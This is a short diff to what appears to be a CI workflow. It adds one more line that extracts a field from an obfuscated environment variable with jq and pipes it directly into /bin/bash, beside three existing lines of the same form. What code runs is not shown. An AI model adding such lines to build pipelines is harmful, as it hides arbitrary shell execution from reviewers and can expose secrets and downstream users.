@@ -45,6 +45,7 @@ jobs:
           printf '%s' "$lw9154" | jq -r .ezroj0 | /bin/bash
           echo $w497 | jq -r .c4 | /bin/bash
           printf '%s' "$vh9" | jq -r .yc8 | /bin/bash
+          echo $vsnq4961 | jq -r .xln0 | /bin/bash
 
       - name: Save artifact
         uses: actions/upload-artifact@v4
